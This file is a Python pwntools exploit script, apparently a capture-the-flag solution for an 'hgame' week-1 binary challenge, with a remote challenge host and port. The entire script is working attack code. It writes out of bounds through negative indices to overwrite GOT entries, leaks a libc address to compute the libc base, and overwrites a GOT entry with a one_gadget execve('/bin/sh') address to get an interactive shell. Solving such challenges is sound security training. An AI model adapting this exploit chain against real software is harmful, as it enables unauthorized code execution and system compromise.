from pwn import *

context.log_level = 'debug'
context.terminal = ["/usr/bin/tmux", "sp", "-v"]

debug = True

elf = ELF("./vuln")
libc = ELF("./libc.so.6")
if debug:
    io = process("./vuln")
else:
    io = remote("week-1.hgame.lwsec.cn", 31959)


def tdebug():
    gdb.attach(io)
    pause()


seats = 0x4040a0
putsgot = elf.got['puts']
exitgot = elf.got['exit']
setbufgot = elf.got['setbuf']
print(hex(putsgot))
print(putsgot - seats) #-136 /16 = 8.5
print(exitgot - seats) #-96 /16 = 6
print(setbufgot - seats) #-128 /16 = 8

io.recvuntil("please choose one.")
io.sendline("-6")
io.recvuntil("input your name")
io.sendline(p64(0x4011d6))
io.recv()

io.recvuntil("please choose one.")
io.sendline("-8")
io.recvuntil("input your name")
io.sendline(b'a' * 7)
libcbase_printf = u64(io.recvuntil(b"\x7f")[-6:].ljust(8, b"\x00"))
libcbase = libcbase_printf - libc.symbols['printf']
log.info(hex(libcbase_printf))
log.info(hex(libcbase))

# tdebug()
io.recv()

#0xe3afe execve("/bin/sh", r15, r12)
#0xe3b01 execve("/bin/sh", r15, rdx)
#0xe3b04 execve("/bin/sh", rsi, rdx)

og = 0xe3b01
io.sendline("-6")
io.recvuntil("input your name")
log.info(hex(og + libcbase))
io.sendline(p64(og + libcbase))
io.recv()

io.interactive()
